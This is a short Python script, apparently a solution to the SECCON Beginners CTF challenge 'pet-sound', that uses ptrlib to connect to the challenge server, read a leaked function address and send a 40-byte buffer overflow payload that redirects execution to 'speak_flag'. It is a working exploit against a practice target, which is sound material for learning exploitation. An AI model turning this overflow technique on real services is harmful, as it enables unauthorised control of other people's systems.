from ptrlib import *

sock = Socket("nc pet-sound.challenges.beginners.seccon.jp 9090")

speak_flag = int(sock.recvlineafter("'speak_flag' is at: "), 16)
print("speak_flag:", hex(speak_flag))

payload = b"A" * 40
payload += p64(speak_flag)
sock.sendlineafter("Pet A > ", payload)

sock.sh()
